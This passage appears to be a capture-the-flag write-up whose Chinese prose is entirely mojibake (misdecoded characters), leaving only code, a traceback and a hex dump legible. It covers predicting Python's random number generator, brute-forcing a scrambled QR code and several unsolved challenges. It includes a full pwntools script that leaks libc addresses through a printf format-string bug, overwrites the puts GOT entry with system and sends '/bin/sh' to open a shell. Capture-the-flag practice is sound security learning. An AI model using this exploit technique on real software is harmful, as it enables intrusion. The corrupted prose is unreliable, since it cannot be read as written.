éƒ½çŸ¥é“ç¼–ç¨‹è¯­è¨€çš„éšæœºæ•°å®é™…ä¸Šæ˜¯ä¼ªéšæœºæ•°ï¼Œå¦‚æœæ‹¿åˆ°Pythonçš„randomåº“ç”Ÿæˆçš„è¿ç»­624ä¸ª32ä½æ•´æ•°ï¼Œå°±å¯ä»¥ç”¨[Python-random-module-cracker](https://github.com/tna0y/Python-random-module-cracker)é¢„æµ‹åé¢çš„éšæœºæ•°åºåˆ—ã€‚æ­£å¥½æºä»£ç é‡Œç»™å‡ºæ¥çš„ç©ºç™½å­—èŠ‚æ˜¯2500ä¸ªï¼Œç›¸å½“äº625ä¸ª32ä½æ•´æ•°ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¿è¡Œä¸€æ¬¡ç¨‹åºï¼Œæ‹¿è¾“å‡ºç»“æœå‰624ä¸ª32ä½æ•´æ•°é¢„æµ‹æœ€åä¸€ä¸ªç¡®ä¿å‡†ç¡®æ€§ï¼Œç„¶åå†é¢„æµ‹å‡ºåé¢çš„éšæœºæ•°åºåˆ—ï¼Œä¸è¾“å‡ºç»“æœå¼‚æˆ–ï¼Œå¾—åˆ°flag 1ã€‚

## åç»´ç 
### Flag 1ï¼šåç»´ç  Â· ç‰¹éš¾
åˆæ˜¯äºŒç»´ç ï¼ˆQRç ï¼‰é¢˜ï¼Œç›´æ¥æŠŠå›¾ç‰‡ä¸‹è½½åˆ°æœ¬åœ°æ‹¼ï¼Œæ£€æŸ¥å‘ç°æ˜¯å·¦ä¸Šè§’çš„å›¾å—ç¼ºå¤±ï¼Œç›´æ¥è¡¥ä¸Šå°±è¡Œã€‚æ ¹æ®[äºŒç»´ç çš„è§„åˆ™](https://zh.wikipedia.org/wiki/QR%E7%A2%BC#%E7%BB%93%E6%9E%84)ï¼Œå¾ˆå®¹æ˜“å°±èƒ½ç¡®å®šå·¦ä¸Šã€å³ä¸Šã€å·¦ä¸‹ä¸‰ä¸ªè§’çš„å›¾å—ã€‚ç„¶åæ ¹æ®é»‘ã€ç™½ã€é»‘ã€ç™½çš„äº¤æ›¿ç¡®å®šç¬¬äºŒåˆ—å’Œç¬¬äºŒè¡Œçš„å›¾å—ã€‚æœ€åæ ¹æ®å³ä¸‹è§’çš„æ ¡æ­£æ ‡å¿—ç¡®å®šç¬¬å››è¡Œç¬¬å››åˆ—çš„å›¾å—ï¼Œä»¥åŠå…¶å³è¾¹å’Œä¸‹è¾¹çš„å›¾å—äºŒé€‰ä¸€ã€‚

![å·²ç¡®è®¤çš„å›¾å—](images/19-1.png)

è¿™æ ·ä¸€æ¥å‰©ä¸‹çš„å›¾å—å°±ä¸å¤šäº†ï¼Œç›´æ¥ç”¨pythonæš´åŠ›å…¨æ’åˆ—ç„¶åå°è¯•è§£ç ï¼š

``` python
import itertools
from PIL import Image
import os
from pyzbar.pyzbar import decode

os.chdir(os.path.dirname(__file__))

image = Image.open("250.png")

file_names = ["015", "020", "014", "004", "003", "018"]
pos = [(100, 0), (0, 100), (100, 100), (150, 100), (200, 100), (100, 150), (100, 200), (200, 200)]

for a, b in [("012", "011"), ("011", "012")]:
  image.paste(Image.open(a + ".png"), (200, 150))
  for c, d in [("002", "010"), ("010", "002")]:
    image.paste(Image.open(c + ".png"), (150, 200))
    for permutations in itertools.permutations(file_names + [b, d]):
      if Image.open(permutations[-1] + ".png").getpixel((2, 2)) != 0:
        continue
      for i, name in enumerate(permutations):
        image.paste(Image.open(name + ".png"), pos[i])
      result = decode(image)
      if len(result) > 0:
        print(result[0].data.decode("ascii"))
```

æœ€åå¾—åˆ°flagã€‚

## å…¶ä»–æœ‰æ€è·¯ä½†æ²¡åšå‡ºæ¥çš„é¢˜
### Dark Room-Flag 2ï¼š
Flag 2æ‰€åœ¨çš„æˆ¿é—´åœ¨æœ€ç»ˆæˆ¿é—´çš„ä¸‹é¢ï¼Œé€šè¿‡è¾“å…¥ç©ºå­—ç¬¦ä¸²èƒ½æŠŠä¸€éƒ¨åˆ†ä»£ç æ³„éœ²å‡ºæ¥ï¼š

``` text
invalid literal for int() with base 10: ''
Traceback (most recent call last):
    File "dark_room/player.py", line 249, in <module>
    248:   while flag_number:
    249:      choice = int(self.recv(b"Guess my public key (give me a number): ").decode())
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    250:      if flag_number & 1:
    251:          p = getStrongPrime(2048)
    252:          q = getStrongPrime(2048)
    253:      flag_number >>= 1
ValueError: invalid literal for int() with base 10: ''
```

ç„¶åå°±ä¸çŸ¥é“æ€ä¹ˆåšäº†ï¼Œçœ‹ç¨‹åºå¤§æ¦‚æ˜¯ç”Ÿæˆäº†ä¸€ä¸ªå¤§è´¨æ•°ï¼Œæ€»ä¸ä¼šæ˜¯è¦çˆ†ç ´è¿™ä¸ªå¤§è´¨æ•°å§ï¼Ÿ

### éº¦æ©Â·åº“æ‹‰å¤«ç‰¹-Flag 3ï¼šä¸ºä»€ä¹ˆä¼šå˜æˆè¿™æ ·å‘¢ï¼Ÿ
ç”¨NBTExplorerèƒ½æ‰¾åˆ°Flag 3æ‰€åœ¨çš„çº¢çŸ³ç”µè·¯åŒºåŸŸï¼Œé€šè¿‡æ›¿æ¢æè´¨åŒ…çš„æ–¹æ³•å¯ä»¥æ˜¾ç¤ºå‡ºçº¢çŸ³ç”µè·¯çš„ä¿¡å·å¼ºåº¦ï¼Œæ­é…OBSå½•å±ï¼ŒæŒ‰ç…§5 fpsçš„å¸§ç‡æˆªå›¾å¹¶è¯†åˆ«ä¿¡å·å¼ºåº¦ï¼Œå¯ä»¥è¯»å‡ºæ¥ä¸€æ®µå­—èŠ‚åºåˆ—ï¼š

```
10B55874DB222471B5BE9775109E779ABE03227745767B210DF0BA7109DEB09864542136010213107A2752FD54AE102F239AE8ABD2A17E79FE10DF1584442D810183510E3AB5104F57FB100A41190B506FB4EE6E4B3B1E55987866B810BDA0EE60F86D8DD84910B410BB1071B800887E7600A4BEE1F3092531555B1001AB91010806115024F0EAD16B1F21050F1034AED2F239AED2BEAA1438E6810ADDE2AF67DB4298E810D6437D608388AE726DE170B33BDA4888B25E10BEE9E179BBE7B105D7B3863E302EFE10419279AA01090FF81010AAF4D7AD58090A57BFBA924310102F09780101D1054FE3AA58AA82D04AE3AD8557F0E2155F6652E10106510101544BBF517FF5101031E444F2A300E518411AD7789E47661EF210107A5D0017D7010185D6A90D522D3013215BFEE02BE721010F9A01046100F1021AED4105BBEAA73995610F7095F6A7BBB54F1333D021D19D484489155310755A8E7DD10E09A1AE8FE1010358D100551010B61044952B106D509D9848887710E910820E55FDBE355839D5F500118BBBD287E1A57105F2893E20EDAB55AA32D78FB15FB0D90D69E0770077E2F6889B10B4605A41E7DA45D80911022B47877311A510B82B48D51010E91B2F25A30AA9E9299718E851033A025B996AFB6A10A9881710554FE3A58DEEE46A01DFBEA64A48B5AFEA0507F11BD5D10920670771106B998AF12DE229AEF411B341079109B9BB63195102986651FF33D1110DE2ADB534510A87D40108E477B9A6822DA334B2D510F5D3B94AA10B951089EEA3110110B1B10103F5504570EED10A00D56626EBF108F5AAEE5B13309972101750B66009AFAF9755337E35BB51D5400E6610AAA716D02313F789ADED55B815AB8F4D3B9AA96B7B9F6B2BFF2B41B10D1010E1619E5466BABF44F8FF8D911BAE9535510EBE5B3310F668855D104A361010727B518872D6FFFAE1EE311AD8FE3101011EAB6640D9701085755188FD29A3A106105DDD3F52220EB10DD362210F10421077D2897E8F550B977E1A57D5F23677668143BBB13A3922EB065F1142D471E221E1010E910559E1913FEFAEEF77115BDD2A7A121F72D3AA8B71A557AE66D1E52689D81108B59E1010ABDE0438103B8589447A8A02FFFEFA27195E1AA5710D52E32AF42EB28E86748FAB15ABB10AA2583106265FBA2510510D4A10E1AA06EB5A78B644B94F6610D374778BA2F9716AAEBF779718975103D10105B8F1154F6FBE6386D22D7B5AB01D3183E58B33B79BAF22233A010310B4F8466B21109799D10B74D166E88D5228F4D33B9AA963A57191010FDF3B5A5D9AB0AE6A111B5E5B66746E8944F915598F7246FF7074861799488300A5FF5D5881ABDB61055810E6BD00101D27ED21F110A3EB1F80FBB62AF7795D6AF8DD38131775BF56992864764A10A00BF4C776416A5CFBEEF38EBFAE3700468BEFD0E7357C171B93758BBEFF6B55218CD87FAE158D4DD7616ABBF5626DDDE7F7F0049B4950A8BB1A2C000000004945444A4426080000000000000DA3330E411F55102310410A84EB3AAAE90103A084928585109274E85591777288DBBA573D5739BE11F101DB310F10729E03D106D584537AB488A104E1B18DFE79A6115F3E57BB83ABB18B38617B447A409F9E92B4D42134104E809AAEDF51024F3E6AB437756F289AA10FD9075EAE07BF101E7EE30E809AED2A38DF03ED7297657B810E613410BD13B30A6E7242D77F96B10AA9D915503D576DE1023BA10FB5D0E88BEB60B477D9E14E677ED912359910E22B51010FE517DD3AD66D224F451FEDE0177E1010B5816E856BA13710A1E6224B48BE7DDDBA6B3332EA76884BFA29FA0643583E101055B797DDA2F714FB5786739999FF08DD7130157993D
```

ä½†æ˜¯ç›´æ¥æŠŠè¿™ä¸ªå­—èŠ‚åºåˆ—æ‰”åˆ°HxDé‡Œçœ‹ç€åƒæ˜¯ä¹±ç ï¼Œå› ä¸ºä¸çŸ¥é“èµ·å§‹æ•°æ®åœ¨å“ªé‡Œï¼Œä¹Ÿçœ‹ä¸å‡ºæ¥å¾ªç¯ä½“ï¼Œæ‰€ä»¥æ²¡æ³•åˆ†ææ˜¯ä»€ä¹ˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œäºæ˜¯ä½œç½¢ã€‚

### ç®€å•çš„æ‰“å­—ç¨¿
TypeScriptçš„ç±»å‹åªåœ¨ç¼–è¯‘çš„æ—¶å€™æ£€æŸ¥ï¼Œæ‰€ä»¥åªèƒ½æƒ³åŠæ³•æåç¼–è¯‘å™¨ï¼Œä½†æ˜¯ä¸çŸ¥é“æ€æ ·æ‰èƒ½è®©â€œflagâ€çš„å†…å®¹è¾“å‡ºè€Œä¸è¾“å‡ºâ€œflagâ€è¿™å‡ ä¸ªå­—ã€‚

### åˆå­¦ C è¯­è¨€-Flag 2
è¿™ä¸ªé¢˜å’Œä¸‹é¢çš„Baby Stack-Flag 2å¥½åƒéƒ½æ˜¯åˆ©ç”¨printfçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯è¿™ä¸ªé¢˜çš„ç¨‹åºä¼¼ä¹æœ‰ä¿æŠ¤ï¼Œæ‰€ä»¥æ²¡èƒ½æƒ³å‡ºæ¥ã€‚

### Baby Stack
#### Flag 1
intæº¢å‡ºå¾ˆå®¹æ˜“çŒœåˆ°ï¼Œç¬¬ä¸€æ­¥è¾“å…¥0å³å¯ï¼Œç¨‹åºé‡Œä¹Ÿç»™äº†åé—¨ï¼Œæƒ³åˆ°æ˜¯æŠŠå‡½æ•°è¿”å›åœ°å€æ›¿æ¢æˆåé—¨æ‰€åœ¨çš„åœ°å€ã€‚ä½†æ˜¯æ ˆæº¢å‡ºä¸çŸ¥é“å¦‚ä½•æ‰èƒ½åˆ©ç”¨ï¼Œbufferçš„ä½ç½®ä¼¼ä¹æ˜¯åœ¨å‡½æ•°è¿”å›åœ°å€çš„ä¸‹é¢ï¼Œä¹Ÿæ²¡æ³•ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²å®é™…è¿è¡Œçš„åœ°å€ã€‚

#### Flag 2
è¿™ä¸ªé¢˜ä¼¼ä¹å°±æ˜¯æ•™ç¨‹ä¸Šå†™çš„é¢˜ç›®ç±»å‹ï¼Œå› ä¸ºæœ€åç”¨åˆ°çš„å‡½æ•°æ˜¯`puts`ï¼Œæ‰€ä»¥æƒ³åˆ°æŠŠ`puts`æ›¿æ¢ä¸º`system`ï¼Œç¬¬ä¸€æ­¥æ³„éœ²çœŸå®åœ°å€ï¼Œç¬¬äºŒæ­¥æ›¿æ¢gotè¡¨çš„è·³è½¬åœ°å€ï¼Œå†™äº†ä¸ªç¨‹åºï¼š

``` python
# -*- coding: utf-8 -*-
from pwn import *

context.log_level = "debug"
context.bits = 64

elf = ELF("./challenge2")
r = process("./challenge2")
libc = ELF("./libc.so.6")

offset = 14
puts_got = elf.got["puts"]
log.success("puts_got    => {}".format(hex(puts_got)))

r.recvuntil(b"please enter your flag~(less than 0x20 characters)\n")
payload = f"%{offset + 1}$s".encode("utf-8").ljust(8, b"a") + p64(puts_got)
r.sendline(payload)

printf_addr = r.recvline()[len(b"this is your flag: "):]
printf_addr = struct.unpack("<Q", printf_addr[:printf_addr.index(b"a")].ljust(8, b"\x00"))[0]
log.success("puts_addr   => {}".format(hex(printf_addr)))

system_addr = printf_addr - (libc.symbols["puts"] - libc.symbols["system"])
log.success("system_addr => {}".format(hex(system_addr)))

btw = sorted(((system_addr & 0xff, 0), ((system_addr >> 8) & 0xff, 1), ((system_addr >> 16) & 0xff, 2)))
payload = f"%{btw[0][0]}c%{offset + 5}$hhn%{btw[1][0] - btw[0][0]}c%{offset + 6}$hhn%{btw[2][0] - btw[1][0]}c%{offset + 7}$hhn".encode().ljust(40, b"a") + p64(puts_got + btw[0][1]) + p64(puts_got + btw[1][1]) + p64(puts_got + btw[2][1])
print(payload)

r.recvuntil(b"What will you do to capture it?:")
r.sendline(payload)

r.recvuntil(b" and your flag again? :")
payload = b"/bin/sh"
r.sendline(payload)

r.interactive()
```

ä½†æ˜¯å®é™…è¿è¡Œçš„æ—¶å€™ä¼šåœ¨æ¢gotè¡¨çš„è·³è½¬åœ°å€æ—¶æŠ¥é”™ï¼Œæ£€æŸ¥äº†ä¸€ä¸‹ç¨‹åºæ˜¯å¯ä»¥å¯¹gotè¡¨è¿›è¡Œå†™å…¥çš„ï¼Œä¸çŸ¥é“æ˜¯å“ªé‡Œå‡ºäº†é—®é¢˜ã€‚

## åè®°
å¯¹æˆ‘æ¥è¯´è¿™æ˜¯ç¬¬äºŒæ¬¡æ­£å¼å‚åŠ è¿™ç§æ¯”èµ›ï¼Œè™½ç„¶è·Ÿæˆ‘æœ¬äººä¸“ä¸šä¹Ÿä¸å¤ªç›¸å…³ï¼Œä½†æ˜¯å°±æ˜¯è§‰å¾—å¾ˆæœ‰æ„æ€ã€‚æ¯”èµ›çš„é¢˜ç›®éƒ½æŒºæœ‰æ„æ€çš„ï¼Œæ˜¯æˆ‘è‡ªå·±å¤ªèœäº†ï¼ŒäºŒè¿›åˆ¶å’Œç®—æ³•é¢˜éƒ½ä¸å¤ªç†Ÿç»ƒï¼Œä¸è¿‡è¿™æ¬¡æ¯”èµ›ä¸­æˆ‘ä¹Ÿæ˜¯è¾¹åšé¢˜è¾¹å­¦ä¹ ï¼Œäº†è§£äº†å¾ˆå¤šçŸ¥è¯†ï¼Œå¸Œæœ›å¯¹ä¹‹åçš„å­¦ä¹ ã€ç”Ÿæ´»ã€ç§‘ç ”ç”šè‡³æ˜¯ä»¥åæ‰¾å·¥ä½œéƒ½æœ‰å¸®åŠ©å§ã€‚

æœ€åæ”¾ä¸€å¼ é£æœºçš„å›¾å§ï¼Œäººç”Ÿä¸­ç¬¬ä¸€æ¬¡åé£æœºï¼Œè¿˜æœ‰ç‚¹å°æ¿€åŠ¨å‘¢ã€‚ç¥å¤§å®¶è¯¸äº‹é¡ºåˆ©ï¼Œä¸€é£å†²å¤©ï¼

![END](images/end.jpg)